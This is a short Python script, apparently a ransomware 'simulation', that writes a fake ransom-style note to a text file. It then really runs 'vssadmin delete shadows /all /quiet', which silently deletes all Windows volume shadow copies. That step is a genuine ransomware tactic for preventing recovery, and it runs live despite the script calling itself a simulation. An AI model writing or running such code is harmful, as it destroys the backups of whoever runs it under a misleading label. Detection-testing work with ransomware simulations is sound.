import subprocess

print("Simulating ransomware...")
with open("test_doc.txt", "w") as f:
    f.write("Important files encrypted!")

subprocess.call("vssadmin delete shadows /all /quiet", shell=True)
